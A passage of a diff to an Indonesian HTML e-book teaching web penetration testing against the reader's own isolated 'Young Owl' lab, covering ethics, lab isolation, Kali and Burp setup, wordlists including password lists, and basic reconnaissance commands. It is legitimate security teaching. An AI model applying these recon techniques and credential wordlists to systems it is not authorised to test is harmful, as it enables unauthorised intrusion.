@@ -2,7 +2,7 @@
 <html lang="id">
   <head>
     <meta charset="utf-8" />
-    <title>Young Owl — Panduan Pentest Lab Sendiri</title>
+    <title>Young Owl — Panduan Lengkap Pentest Lab Sendiri</title>
     <style>
       :root {
         --ink: #1e293b;
@@ -36,6 +36,7 @@
       h2,
       h3,
       h4,
+      h5,
       .sans {
         font-family: 'Helvetica Neue', Arial, sans-serif;
       }
@@ -59,7 +60,7 @@
         line-height: 1;
       }
       .cover h1 {
-        font-size: 30pt;
+        font-size: 29pt;
         margin: 10mm 0 2mm;
         letter-spacing: -0.5px;
         color: #0f172a;
@@ -77,7 +78,7 @@
       }
       .cover .warn {
         margin-top: 10mm;
-        max-width: 120mm;
+        max-width: 125mm;
         font-family: 'Helvetica Neue', Arial, sans-serif;
         font-size: 8.8pt;
         color: var(--warn-ink);
@@ -107,11 +108,19 @@
         font-size: 12.5pt;
         color: #0f172a;
         margin: 7mm 0 2mm;
+        border-left: 3px solid var(--cyan);
+        padding-left: 3mm;
       }
       h4 {
-        font-size: 10.5pt;
+        font-size: 10.8pt;
         color: var(--accent);
         margin: 5mm 0 1mm;
+      }
+      h5 {
+        font-size: 10pt;
+        color: #0f172a;
+        margin: 4mm 0 1mm;
+        font-weight: bold;
       }
       p {
         margin: 0 0 3mm;
@@ -139,7 +148,7 @@
         color: #e2e8f0;
         padding: 4mm 5mm;
         border-radius: 7px;
-        font-size: 8.6pt;
+        font-size: 8.5pt;
         line-height: 1.5;
         overflow-x: auto;
         margin: 3mm 0;
@@ -157,7 +166,8 @@
       }
       .note,
       .warn-box,
-      .detect {
+      .detect,
+      .tip {
         border-radius: 8px;
         padding: 4mm 5mm;
         margin: 4mm 0;
@@ -178,9 +188,14 @@
         background: #f0fdf4;
         border: 1px solid #bbf7d0;
       }
+      .tip {
+        background: #fffbeb;
+        border: 1px solid #fde68a;
+      }
       .note b,
       .warn-box b,
-      .detect b {
+      .detect b,
+      .tip b {
         font-family: 'Helvetica Neue', Arial, sans-serif;
       }
       table {
@@ -214,10 +229,10 @@
         list-style: none;
         padding: 0;
         font-family: 'Helvetica Neue', Arial, sans-serif;
-        font-size: 10.5pt;
+        font-size: 10.3pt;
       }
       .toc li {
-        padding: 2mm 0;
+        padding: 1.8mm 0;
         border-bottom: 1px dotted var(--line);
         color: var(--ink);
       }
@@ -245,27 +260,33 @@
         margin-top: 8mm;
         page-break-before: always;
       }
+      .kv {
+        font-size: 9pt;
+        font-family: 'Helvetica Neue', Arial, sans-serif;
+      }
     </style>
   </head>
   <body>
     <!-- COVER -->
     <section class="cover">
       <div class="owl">🦉</div>
-      <h1>Panduan Pentest Lab Sendiri</h1>
+      <h1>Panduan Lengkap Pentest Lab Sendiri</h1>
       <div class="sub">
-        Dari Information Gathering sampai Deteksi &amp; Pelaporan — dengan Kali Linux, di lab Young
-        Owl Anda
+        Dari Information Gathering, Scanning, Eksploitasi, sampai Backdoor, Deteksi &amp; Pelaporan —
+        dengan Kali Linux, di lab Young Owl Anda
       </div>
       <div class="meta">
-        Young Owl · Edisi lab pribadi · Edisi diperluas · 2026<br />
+        Young Owl · Edisi lab pribadi · Edisi lengkap &amp; diperluas · 2026<br />
         Hanya untuk target milik Anda sendiri.
       </div>
       <div class="warn">
         <b>Etika &amp; hukum.</b> Semua teknik di buku ini hanya boleh dijalankan terhadap lab Young
         Owl Anda sendiri atau sistem yang Anda miliki / memiliki izin tertulis untuk diuji.
         Menyerang sistem orang lain tanpa izin adalah tindak pidana di banyak yurisdiksi, termasuk
-        Indonesia (UU ITE). Lab Young Owl berisi data dummy, terisolasi, dan tidak punya jalan
-        keluar ke internet — itulah yang membuatnya aman untuk latihan.
+        Indonesia (UU ITE Pasal 30–33). Lab Young Owl berisi data dummy, terisolasi, dan tidak punya
+        jalan keluar ke internet — itulah yang membuatnya aman untuk latihan. Buku ini sengaja
+        berhenti pada batas edukatif: teknik backdoor dan persistence dibahas untuk dikenali dan
+        dideteksi, bukan untuk menyamar dari defender di sistem nyata.
       </div>
     </section>
 
@@ -274,412 +295,565 @@
       <h2>Daftar Isi</h2>
       <ol>
         <li>
-          <span class="cn">0</span>Pengantar, etika, dan menyiapkan arena
-          <small
-            >Metodologi, aturan main, cara kerja lab, dan kenapa boleh menyerang Young Owl
-            sendiri.</small
-          >
+          <span class="cn">0</span>Pengantar, etika, metodologi, dan menyiapkan arena
+          <small>Siklus pentest, OWASP &amp; ATT&amp;CK, aturan main, dan cara kerja lab.</small>
         </li>
         <li>
-          <span class="cn">1</span>Menyiapkan Kali Linux
-          <small>Tools inti, Burp Suite, wordlist, dan menghubungkan Kali ke lab di VPS.</small>
+          <span class="cn">1</span>Menyiapkan Kali Linux &amp; laboratorium kerja
+          <small>Tools inti, Burp Suite mendalam, wordlist, variabel, dan alur kerja catatan.</small>
         </li>
         <li>
-          <span class="cn">2</span>Information Gathering
-          <small>OSINT pasif dan pengintaian aktif — di lab dan di dunia nyata.</small>
+          <span class="cn">2</span>Information Gathering (OSINT)
+          <small>Pengintaian pasif &amp; aktif, fingerprinting, menyusun kartu target.</small>
         </li>
         <li>
-          <span class="cn">3</span>Reconnaissance
-          <small>Host discovery, port scanning, enumerasi layanan, dan content discovery.</small>
+          <span class="cn">3</span>Reconnaissance &amp; Enumerasi
+          <small>Host discovery, Nmap mendalam, NSE, content &amp; parameter discovery.</small>
         </li>
         <li>
           <span class="cn">4</span>Vulnerability Scanning (sangat detail)
-          <small>Metodologi, scanner otomatis, pengujian manual per OWASP, dan triase.</small>
+          <small>Metodologi, scanner otomatis mendalam, pengujian manual per OWASP, triase.</small>
         </li>
         <li>
           <span class="cn">5</span>Exploitation / Pentesting (sangat detail)
-          <small>Walkthrough mendalam tiap celah + jejak yang tertinggal untuk deteksi.</small>
+          <small>Walkthrough mendalam tiap kelas celah: teori, payload, perbaikan, jejak.</small>
         </li>
         <li>
           <span class="cn">6</span>Post-Exploitation &amp; Backdoor (hands-on di lab + deteksi)
-          <small
-            >Web shell, reverse shell, persistence — dijalankan di lab Anda, lalu dideteksi.</small
-          >
+          <small>Web shell, reverse shell, persistence — di lab Anda, lalu diburu &amp; dibersihkan.</small>
         </li>
         <li>
-          <span class="cn">7</span>Deteksi &amp; Monitoring Serangan
-          <small>Membaca serangan dari sisi bertahan: seperti sniffing/IDS untuk web Anda.</small>
+          <span class="cn">7</span>Deteksi, Monitoring &amp; Blue Team
+          <small>Membaca serangan dari sisi bertahan: signature, korelasi, dan monitor in-app.</small>
         </li>
         <li>
-          <span class="cn">8</span>Pelaporan
-          <small>CVSS, menulis temuan, dan menutup siklus di Young Owl.</small>
+          <span class="cn">8</span>Pelaporan &amp; Remediasi
+          <small>CVSS, menulis temuan, retest, dan menutup siklus di Young Owl.</small>
         </li>
         <li>
-          <span class="cn">A</span>Lampiran: cheat sheet, tanda-tanda serangan &amp; daftar flag
-          <small>Perintah ofensif, signature deteksi, dan tantangan lab.</small>
+          <span class="cn">A</span>Lampiran: cheat sheet, signature, glosarium &amp; daftar flag
+          <small>Perintah ofensif, tanda serangan defensif, istilah, dan tantangan lab.</small>
         </li>
       </ol>
     </section>
 
     <!-- CH 0 -->
-    <h2 class="chapter"><span class="n">BAB 0</span>Pengantar, etika, dan menyiapkan arena</h2>
+    <h2 class="chapter"><span class="n">BAB 0</span>Pengantar, etika, metodologi, dan menyiapkan arena</h2>
     <p class="lead">
       Buku ini mengajak Anda menempuh satu siklus penetration test yang utuh terhadap aplikasi web
       Anda sendiri — Young Owl dalam "lab mode" — memakai Kali Linux, lalu menutupnya dengan sisi
-      bertahan: mendeteksi serangan yang baru saja Anda lakukan.
+      bertahan: mendeteksi serangan yang baru saja Anda lakukan. Edisi ini diperluas agar setiap
+      tahap dapat diikuti langkah demi langkah oleh pemula, tanpa mengorbankan kedalaman.
     </p>
-    <h3>Siklus penetration test</h3>
+
+    <h3>0.1 Untuk siapa buku ini</h3>
+    <p>
+      Buku ini ditulis untuk Anda yang memiliki Young Owl dan ingin memahaminya dari dua sisi
+      sekaligus: sebagai penyerang (merah) yang mencoba menembus, dan sebagai pemilik (biru) yang
+      harus mendeteksi dan menambal. Tidak dibutuhkan pengalaman keamanan sebelumnya — hanya
+      kenyamanan dasar dengan terminal Linux dan HTTP. Setiap istilah teknis dijelaskan saat pertama
+      muncul, dan daftar glosarium ada di Lampiran.
+    </p>
+
+    <h3>0.2 Siklus penetration test</h3>
     <p>Sebuah pentest mengikuti alur yang berulang. Buku ini disusun persis mengikuti alur itu:</p>
     <ol>
       <li><strong>Information Gathering</strong> — kumpulkan konteks tentang target.</li>
-      <li><strong>Reconnaissance</strong> — petakan host, port, dan layanan.</li>
-      <li><strong>Vulnerability Scanning</strong> — temukan kelemahan.</li>
-      <li><strong>Exploitation</strong> — buktikan kelemahan itu nyata.</li>
-      <li><strong>Post-Exploitation</strong> — pahami dampak, foothold, dan persistence.</li>
+      <li><strong>Reconnaissance &amp; Enumerasi</strong> — petakan host, port, layanan, endpoint.</li>
+      <li><strong>Vulnerability Scanning</strong> — temukan dan verifikasi kelemahan.</li>
+      <li><strong>Exploitation</strong> — buktikan kelemahan itu nyata dan ukur dampaknya.</li>
+      <li><strong>Post-Exploitation</strong> — pahami foothold, data, dan persistence.</li>
       <li><strong>Deteksi &amp; Monitoring</strong> — lihat jejak serangan dari sisi defender.</li>
-      <li><strong>Reporting</strong> — tulis temuan agar bisa diperbaiki.</li>
+      <li><strong>Reporting &amp; Remediasi</strong> — tulis temuan agar bisa diperbaiki, lalu retest.</li>
     </ol>
     <p>
       Dua langkah terakhir adalah fokus khusus edisi ini: setiap serangan meninggalkan jejak, dan
       tujuan akhir Anda bukan sekadar menembus, melainkan juga <em>melihat</em> penembusan itu
-      terjadi dan memperbaikinya.
+      terjadi dan memperbaikinya. Inilah yang membedakan seorang praktisi keamanan dari sekadar
+      "script kiddie".
     </p>
+
     <div class="warn-box">
       <b>Aturan tunggal yang tidak bisa ditawar:</b> hanya serang lab Anda sendiri. Young Owl lab
-      dirancang untuk diserang; sistem lain tidak. Catat lingkup (alamat, waktu) sebelum mulai,
-      seperti pentester profesional, dan simpan bukti tiap langkah.
+      dirancang untuk diserang; sistem lain tidak. Catat lingkup (alamat, waktu mulai/selesai)
+      sebelum mulai, seperti pentester profesional, dan simpan bukti tiap langkah. Kalau Anda
+      berlatih bersama teman, pastikan hanya pada lab milik bersama, bukan mesin pihak ketiga.
     </div>
-    <h3>Dua kerangka yang dipakai sepanjang buku</h3>
+
+    <h3>0.3 Tiga kerangka yang dipakai sepanjang buku</h3>
+    <h4>OWASP Top 10 — peta "apa yang dicari"</h4>
     <p>
-      <strong>OWASP Top 10</strong> adalah daftar kelas kerentanan web paling umum — peta untuk tahu
-      <em>apa</em> yang dicari. <strong>Cyber Kill Chain / MITRE ATT&amp;CK</strong> menjelaskan
-      <em>urutan</em> langkah penyerang (recon → akses → aksi). Keduanya bukan hafalan; mereka
-      menjaga Anda sistematis sehingga tidak ada permukaan serang yang terlewat.
+      <strong>OWASP Top 10</strong> adalah daftar kelas kerentanan web paling umum dan berdampak.
+      Ia bukan daftar bug spesifik, melainkan kategori. Young Owl lab sengaja menanam contoh dari
+      sebagian besar kategori ini:
     </p>
-    <h3>Kenapa aman menyerang Young Owl sendiri</h3>
+    <table>
+      <tr><th>Kode</th><th>Kategori</th><th>Contoh di lab Young Owl</th></tr>
+      <tr><td>A01</td><td>Broken Access Control</td><td>IDOR pada export, path traversal file</td></tr>
+      <tr><td>A02</td><td>Cryptographic Failures</td><td>Data sensitif/secret bocor via debug &amp; env</td></tr>
+      <tr><td>A03</td><td>Injection</td><td>SQLi pada pencarian, XSS tersimpan, command injection</td></tr>
+      <tr><td>A04</td><td>Insecure Design</td><td>Alur yang mempercayai input klien</td></tr>
+      <tr><td>A05</td><td>Security Misconfiguration</td><td>Endpoint debug terbuka, header hilang</td></tr>
+      <tr><td>A06</td><td>Vulnerable Components</td><td>Versi layanan usang (dibaca dari fingerprint)</td></tr>
+      <tr><td>A07</td><td>Auth &amp; Identity Failures</td><td>Enumerasi login, tanpa rate limit</td></tr>
+      <tr><td>A08</td><td>Software &amp; Data Integrity</td><td>Konsep: rantai pasok &amp; integritas artefak</td></tr>
+      <tr><td>A09</td><td>Logging &amp; Monitoring Failures</td><td>Justru yang Anda perbaiki di Bab 7</td></tr>
+      <tr><td>A10</td><td>SSRF</td><td>Konsep: server menjangkau alamat internal</td></tr>
+    </table>
+    <h4>Cyber Kill Chain &amp; MITRE ATT&amp;CK — peta "urutan langkah"</h4>
+    <p>
+      <strong>Cyber Kill Chain</strong> (Lockheed Martin) menggambarkan tahap serangan sebagai
+      rantai: recon → weaponization → delivery → exploitation → installation → command &amp; control
+      → actions on objective. <strong>MITRE ATT&amp;CK</strong> memperinci ini menjadi taktik (tujuan
+      penyerang) dan teknik (cara mencapainya). Anda tidak perlu menghafal keduanya; keduanya
+      sekadar menjaga Anda sistematis sehingga tidak ada permukaan serang yang terlewat, dan memberi
+      kosakata bersama saat menulis laporan.
+    </p>
+
+    <h3>0.4 Kenapa aman menyerang Young Owl sendiri</h3>
     <p>
       Young Owl berjalan dalam dua salinan. Salinan <strong>normal</strong> (control center)
       menyimpan catatan dan laporan Anda dan tetap dijaga aman di <code>VULN_MODE=false</code>.
       Salinan <strong>lab</strong> (<code>VULN_MODE=true</code>) sengaja dibuat rentan dan itulah
-      yang Anda serang. Salinan lab:
+      yang Anda serang. Salinan lab memiliki empat properti isolasi:
     </p>
     <ul>
       <li>
-        memakai database dummy sendiri yang hidup di RAM (<code>tmpfs</code>) dan ter-reset
-        otomatis;
-      </li>
-      <li>berada di jaringan Docker terpisah tanpa jalur ke aplikasi asli atau database asli;</li>
-      <li>
-        diblokir keluar ke internet (egress), jadi RCE sekalipun tidak bisa kabur dari server;
+        <strong>Database dummy di RAM</strong> — hidup di <code>tmpfs</code> dan ter-reset otomatis,
+        jadi tidak ada data asli yang bisa rusak.
       </li>
       <li>
-        berjalan di container <em>read-only</em> dengan <code>no-new-privileges</code> dan batas
-        CPU/RAM.
+        <strong>Jaringan Docker terpisah</strong> — tanpa jalur ke aplikasi asli atau database asli.
+        RCE di lab tidak bisa "melompat" ke control center.
+      </li>
+      <li>
+        <strong>Egress diblokir</strong> — koneksi keluar dari jaringan lab di-drop, jadi RCE
+        sekalipun tidak bisa kabur dari server (ini akan jadi pelajaran penting di Bab 6).
+      </li>
+      <li>
+        <strong>Container read-only &amp; dibatasi</strong> — <code>read_only: true</code>,
+        <code>no-new-privileges</code>, dan batas CPU/RAM membuat penyalahgunaan sumber daya &amp;
+        penanaman berkas gagal.
       </li>
     </ul>
     <p>
       Artinya Anda bisa berlatih sebebasnya: yang paling buruk terjadi, Anda tinggal reset lab
       (<code>bash infrastructure/lab/reset.sh</code>). Detail ada di <code>docs/lab-mode.md</code>.
       Properti isolasi ini juga jadi pelajaran tersendiri: di Bab 6 Anda akan melihat bagaimana
-      masing-masing menggagalkan sebuah teknik serangan nyata.
+      masing-masing menggagalkan sebuah teknik serangan nyata — sebuah demonstrasi langsung tentang
+      <em>mengapa</em> arsitektur yang aman penting.
     </p>
 
+    <h3>0.5 Cara memakai buku ini</h3>
+    <p>
+      Ikuti bab secara berurutan untuk pertama kali — tiap bab memakai hasil bab sebelumnya. Setelah
+      itu, Lampiran berfungsi sebagai rujukan cepat. Setiap bab eksploitasi (Bab 5) punya pola tetap:
+      <em>teori singkat → langkah manual → otomasi → perbaikan → jejak untuk deteksi</em>. Blok
+      berwarna membantu Anda menavigasi:
+    </p>
+    <div class="note"><b>Catatan biru</b> — tips alur kerja atau penjelasan tambahan.</div>
+    <div class="tip"><b>Tips kuning</b> — trik praktis yang mempercepat pekerjaan.</div>
+    <div class="detect"><b>Kotak hijau "Sisi bertahan"</b> — jejak yang ditinggalkan serangan dan cara mendeteksinya.</div>
+    <div class="warn-box"><b>Kotak merah</b> — peringatan etika/keamanan yang wajib dipatuhi.</div>
+
     <!-- CH 1 -->
-    <h2 class="chapter"><span class="n">BAB 1</span>Menyiapkan Kali Linux</h2>
-    <p class="lead">Kali adalah distribusi Linux berisi ratusan tools keamanan siap pakai.</p>
-    <h3>Tools inti yang dipakai di buku ini</h3>
+    <h2 class="chapter"><span class="n">BAB 1</span>Menyiapkan Kali Linux &amp; laboratorium kerja</h2>
+    <p class="lead">
+      Kali adalah distribusi Linux berisi ratusan tools keamanan siap pakai. Bab ini menyiapkan
+      lingkungan kerja Anda dan menjelaskan tiap tool inti secara mendalam agar Anda tahu
+      <em>kapan</em> dan <em>mengapa</em> memakainya, bukan sekadar menyalin perintah.
+    </p>
+
+    <h3>1.1 Memasang &amp; memperbarui Kali</h3>
+    <p>
+      Jalankan Kali sebagai VM (VirtualBox/VMware) di Windows Anda, atau sebagai WSL2. Setelah masuk,
+      perbarui paket agar tool dan signature-nya mutakhir:
+    </p>
+    <pre><code>sudo apt update &amp;&amp; sudo apt -y full-upgrade
+sudo apt -y install seclists   <span class="c"># koleksi wordlist bila belum ada</span></code></pre>
+    <div class="tip">
+      <b>Snapshot.</b> Sebelum mulai eksperimen, ambil snapshot VM Kali. Kalau konfigurasi kacau,
+      Anda bisa kembali ke kondisi bersih dalam hitungan detik.
+    </div>
+
+    <h3>1.2 Tools inti yang dipakai di buku ini</h3>
     <table>
       <tr>
         <th>Tool</th>
         <th>Fungsi</th>
         <th>Tahap</th>
       </tr>
-      <tr>
-        <td><code>nmap</code></td>
-        <td>Host discovery, port &amp; service scanning</td>
-        <td>Recon</td>
-      </tr>
-      <tr>
-        <td><code>whatweb</code>, <code>wafw00f</code></td>
-        <td>Fingerprint teknologi &amp; WAF</td>
-        <td>Recon</td>
-      </tr>
-      <tr>
-        <td><code>ffuf</code>/<code>gobuster</code></td>
-        <td>Content &amp; direktori discovery, fuzzing parameter</td>
-        <td>Recon / Vuln scan</td>
-      </tr>
-      <tr>
-        <td><code>nikto</code>, <code>nuclei</code></td>
-        <td>Scan web otomatis, template kerentanan</td>
-        <td>Vuln scan</td>
-      </tr>
-      <tr>
-        <td><code>curl</code>, <code>Burp Suite</code>, <code>OWASP ZAP</code></td>
-        <td>Menyusun, mengulang &amp; memeriksa request HTTP</td>
-        <td>Semua</td>
-      </tr>
-      <tr>
-        <td><code>sqlmap</code></td>
-        <td>Deteksi &amp; otomasi SQL injection</td>
-        <td>Vuln scan / Exploit</td>
-      </tr>
-      <tr>
-        <td><code>hydra</code>, <code>ffuf</code></td>
-        <td>Uji kredensial (brute force / enumerasi)</td>
-        <td>Exploit</td>
-      </tr>
-      <tr>
-        <td><code>jq</code></td>
-        <td>Mem-parse respons JSON API</td>
-        <td>Semua</td>
-      </tr>
+      <tr><td><code>nmap</code></td><td>Host discovery, port &amp; service scanning, skrip NSE</td><td>Recon</td></tr>
+      <tr><td><code>whatweb</code>, <code>wafw00f</code></td><td>Fingerprint teknologi &amp; deteksi WAF</td><td>Recon</td></tr>
+      <tr><td><code>ffuf</code> / <code>gobuster</code></td><td>Content &amp; direktori discovery, fuzzing parameter</td><td>Recon / Vuln scan</td></tr>
+      <tr><td><code>nikto</code>, <code>nuclei</code></td><td>Scan web otomatis, template kerentanan komunitas</td><td>Vuln scan</td></tr>
+      <tr><td><code>curl</code>, <code>httpie</code></td><td>Menyusun &amp; mengulang request HTTP di CLI</td><td>Semua</td></tr>
+      <tr><td><code>Burp Suite</code>, <code>OWASP ZAP</code></td><td>Proxy pencegat: lihat, tahan, ubah request</td><td>Semua</td></tr>
+      <tr><td><code>sqlmap</code></td><td>Deteksi &amp; otomasi SQL injection</td><td>Vuln scan / Exploit</td></tr>
+      <tr><td><code>hydra</code>, <code>ffuf</code></td><td>Uji kredensial (brute force / enumerasi)</td><td>Exploit</td></tr>
+      <tr><td><code>jq</code></td><td>Mem-parse &amp; menyaring respons JSON API</td><td>Semua</td></tr>
+      <tr><td><code>dig</code>, <code>whois</code></td><td>Enumerasi DNS &amp; kepemilikan domain</td><td>OSINT</td></tr>
     </table>
-    <h3>Menyiapkan Burp Suite (proxy pencegat)</h3>
     <p>
-      Burp duduk di antara browser dan target sehingga Anda bisa melihat, menahan, dan mengubah tiap
-      request. Alur dasar: jalankan Burp → set browser memakai proxy
-      <code>127.0.0.1:8080</code> milik Burp → pasang sertifikat CA Burp agar HTTPS bisa dibaca →
-      kirim request menarik ke <strong>Repeater</strong> untuk diuji berulang. Untuk API seperti
-      Young Owl, Repeater adalah tempat Anda akan paling sering bekerja.
+      Young Owl adalah aplikasi <em>API-first</em>: hampir semua interaksi menarik berupa request
+      JSON ke <code>/api/v1/...</code>. Karena itu <code>curl</code> + <code>jq</code> + Burp Repeater
+      akan jadi tiga tool yang paling sering Anda pakai, jauh lebih sering daripada scanner besar.
     </p>
+
+    <h3>1.3 Burp Suite — proxy pencegat, secara mendalam</h3>
+    <p>
+      Burp duduk di antara browser/klien dan target sehingga Anda bisa melihat, menahan, dan mengubah
+      tiap request. Memahami Burp adalah lompatan terbesar seorang pemula web pentest. Alur dasar:
+    </p>
+    <ol>
+      <li>Jalankan Burp (Community Edition cukup untuk buku ini).</li>
+      <li>Set browser memakai proxy <code>127.0.0.1:8080</code> milik Burp (pakai ekstensi FoxyProxy agar mudah di-toggle).</li>
+      <li>Pasang sertifikat CA Burp (<code>http://burp</code> → CA Certificate) agar HTTPS bisa dibaca tanpa peringatan.</li>
+      <li>Jelajahi aplikasi; tiap request terekam di tab <strong>Proxy &gt; HTTP history</strong>.</li>
+      <li>Kirim request menarik ke <strong>Repeater</strong> (Ctrl+R) untuk diuji berulang dengan modifikasi.</li>
+    </ol>
+    <h4>Komponen Burp yang akan Anda pakai</h4>
+    <table>
+      <tr><th>Tab</th><th>Gunanya</th></tr>
+      <tr><td>Proxy</td><td>Menangkap &amp; menahan request/response secara langsung.</td></tr>
+      <tr><td>Repeater</td><td>Mengirim ulang satu request dengan sedikit perubahan — tempat utama menguji injeksi.</td></tr>
+      <tr><td>Intruder</td><td>Mengotomasi banyak variasi (fuzzing parameter, enumerasi id). Di CE kecepatannya dibatasi.</td></tr>
+      <tr><td>Decoder</td><td>Encode/decode URL, Base64, hex — berguna untuk menyiapkan payload.</td></tr>
+      <tr><td>Comparer</td><td>Membandingkan dua respons (misalnya untuk membedakan "email dikenal" vs "tidak").</td></tr>
+    </table>
     <div class="note">
       <b>Catatan port.</b> Burp secara default juga memakai port 8080 di <em>Kali</em>. Itu tidak
       bentrok dengan lab, karena lab di port 8080 ada di <em>VPS</em> (host berbeda). Kalau bingung,
-      ubah salah satu.
+      ubah salah satu di Burp &gt; Settings &gt; Proxy.
     </div>
-    <h3>Wordlist</h3>
+
+    <h3>1.4 Wordlist — bahan bakar fuzzing</h3>
     <p>
       Banyak serangan butuh wordlist (daftar tebakan). Di Kali sudah tersedia
-      <code>SecLists</code> dan <code>dirb</code>:
+      <code>SecLists</code> dan <code>dirb</code>. Memilih wordlist yang tepat menghemat waktu:
     </p>
-    <pre><code><span class="c"># Direktori umum untuk content discovery</span>
-/usr/share/wordlists/dirb/common.txt
+    <pre><code><span class="c"># Direktori/endpoint umum untuk content discovery</span>
+/usr/share/wordlists/dirb/common.txt                 <span class="c"># cepat, ~4600 entri</span>
 /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt  <span class="c"># khusus API</span>
 
 <span class="c"># Password umum untuk uji login</span>
-/usr/share/wordlists/rockyou.txt            <span class="c"># gunzip dulu bila perlu</span></code></pre>
-    <h3>Menghubungkan Kali ke lab</h3>
+/usr/share/wordlists/rockyou.txt                     <span class="c"># gunzip dulu bila perlu</span>
+/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+
+<span class="c"># Nama parameter untuk menemukan input tersembunyi</span>
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</code></pre>
+    <div class="tip">
+      <b>Mulai kecil.</b> Untuk lab, pakai <code>common.txt</code> dulu. Wordlist raksasa membuat
+      scan lambat dan log penuh — belum tentu menemukan lebih banyak di target kecil.
+    </div>
+
+    <h3>1.5 Menghubungkan Kali ke lab &amp; variabel kerja</h3>
     <p>
       Lab berjalan di VPS Anda, publik pada port <code>8080</code>. Dari Kali, target Anda adalah
-      <code>http://&lt;ip-vps&gt;:8080</code>. Simpan sebagai variabel supaya perintah lebih
-      ringkas, lalu verifikasi Anda benar menyentuh salinan <em>lab</em> (bukan control center):
+      <code>http://&lt;ip-vps&gt;:8080</code>. Simpan sebagai variabel supaya perintah lebih ringkas,
+      lalu verifikasi Anda benar menyentuh salinan <em>lab</em> (bukan control center):
     </p>
     <pre><code>export LAB=http://&lt;ip-vps&gt;:8080
 curl -s $LAB/api/v1/system/health | jq    <span class="c"># { "status": "ok", "vulnMode": true }</span></code></pre>
     <p>
       <code>"vulnMode": true</code> memastikan endpoint rentan aktif. Bila <code>false</code>, Anda
-      menyerang salinan aman — tidak akan menemukan apa-apa.
+      menyerang salinan aman — tidak akan menemukan apa-apa. Simpan variabel permanen di
+      <code>~/.bashrc</code> agar tetap ada setelah terminal ditutup.
     </p>
     <div class="note">
       <b>Tips alur kerja.</b> Buat satu <em>assessment</em> baru di salinan Young Owl yang normal
       sebelum mulai. Setiap temuan yang Anda dapat, catat di sana sambil jalan — itu melatih alur
-      kerja pentester yang sebenarnya, dan di Bab 8 tinggal di-export jadi laporan.
+      kerja pentester yang sebenarnya, dan di Bab 8 tinggal di-export jadi laporan. Biasakan juga
+      menyimpan output tiap perintah ke berkas (<code>| tee recon.txt</code>) sebagai bukti.
     </div>
 
+    <h3>1.6 Higiene &amp; etika teknis</h3>
+    <ul>
+      <li><strong>Catat waktu</strong> mulai dan selesai tiap sesi — berguna untuk mencocokkan dengan log di Bab 7.</li>
+      <li><strong>Satu target.</strong> Pastikan <code>$LAB</code> selalu menunjuk IP VPS Anda, bukan salah ketik ke host lain.</li>
+      <li><strong>Jangan merusak data.</strong> Walau dummy, biasakan membuktikan celah tanpa menghancurkan — itu kebiasaan profesional.</li>
+      <li><strong>Reset bila ragu.</strong> Jika lab berperilaku aneh, reset; jangan menghabiskan waktu men-debug state kotor.</li>
+    </ul>
+
     <!-- CH 2 -->
-    <h2 class="chapter"><span class="n">BAB 2</span>Information Gathering</h2>
+    <h2 class="chapter"><span class="n">BAB 2</span>Information Gathering (OSINT)</h2>
     <p class="lead">
       Mengumpulkan informasi sebelum menyentuh target. Pasif = tanpa mengirim paket ke target; aktif
-      = mulai berinteraksi.
+      = mulai berinteraksi. Makin banyak konteks di tahap ini, makin terarah serangan Anda nanti.
     </p>
-    <h3>Pengintaian pasif</h3>
+
+    <h3>2.1 Mengapa fase ini menentukan</h3>
+    <p>
+      Penyerang berpengalaman menghabiskan waktu paling banyak justru di sini. Alasannya sederhana:
+      setiap serangan di bab berikutnya hanya seefektif pemahaman Anda tentang target. Teknologi apa
+      yang dipakai menentukan kelas celah yang mungkin; endpoint yang ditemukan menentukan di mana
+      menguji; akun yang diketahui menentukan apa yang bisa dicoba. Tujuannya adalah menyusun sebuah
+      <strong>kartu target</strong> yang hidup — dokumen ringkas berisi semua yang Anda ketahui.
+    </p>
+
+    <h3>2.2 Pengintaian pasif</h3>
     <p>Di dunia nyata, informasi berharga sering tersedia tanpa menyentuh target sama sekali:</p>
     <ul>
-      <li>
-        <strong>Certificate Transparency</strong> (crt.sh) — temukan subdomain dari log sertifikat.
-      </li>
-      <li>
-        <strong>Google dork</strong> — <code>site:</code>, <code>inurl:</code>,
-        <code>filetype:</code> untuk halaman &amp; berkas yang terekspos.
-      </li>
+      <li><strong>Certificate Transparency</strong> (crt.sh) — temukan subdomain dari log sertifikat publik.</li>
+      <li><strong>Google dork</strong> — <code>site:</code>, <code>inurl:</code>, <code>filetype:</code>, <code>intitle:</code> untuk halaman &amp; berkas yang terekspos.</li>
       <li><strong>Wayback Machine / arsip</strong> — endpoint lama yang mungkin masih hidup.</li>
-      <li>
-        <strong>WHOIS &amp; DNS</strong> — pemilik, name server, record (<code>dig</code>,
-        <code>whois</code>).
-      </li>
-      <li><strong>Metadata dokumen</strong> — nama user, software, path internal.</li>
+      <li><strong>WHOIS &amp; DNS</strong> — pemilik, name server, record (<code>dig</code>, <code>whois</code>).</li>
+      <li><strong>Metadata dokumen</strong> — nama user, software, path internal yang tertinggal di PDF/gambar.</li>
+      <li><strong>Repositori kode publik</strong> — secret atau endpoint yang tak sengaja ter-commit.</li>
     </ul>
     <p>
-      Di lab, pengintaian pasif yang relevan adalah membaca yang diberikan server secara cuma-cuma:
+      Di lab, pengintaian pasif yang relevan adalah membaca yang diberikan server secara cuma-cuma —
+      ini meniru bagaimana <code>robots.txt</code> di dunia nyata sering membocorkan jalur sensitif:
     </p>
     <pre><code>curl -s $LAB/robots.txt</code></pre>
     <p>
       Berkas ini menyebut sebuah endpoint debug — breadcrumb klasik. Siapa pun yang menulis
-      <code>Disallow:</code> sebenarnya sedang menunjukkan jalur yang ingin disembunyikan.
+      <code>Disallow:</code> sebenarnya sedang menunjukkan jalur yang ingin disembunyikan. Catat
+      jalur itu; Anda akan mengunjunginya di Bab 4.
     </p>
-    <h3>Pengintaian aktif</h3>
+
+    <h3>2.3 Pengintaian aktif &amp; fingerprinting</h3>
     <p>Begitu Anda mengirim request, Anda sudah aktif. Mulai dari header dan fingerprint:</p>
     <pre><code>curl -sI $LAB/            <span class="c"># Server, X-Powered-By, cookie, header keamanan</span>
 whatweb $LAB
 wafw00f  $LAB             <span class="c"># apakah ada WAF di depan?</span></code></pre>
+    <p>Dari respons header, perhatikan secara khusus:</p>
+    <table>
+      <tr><th>Yang dibaca</th><th>Artinya untuk serangan</th></tr>
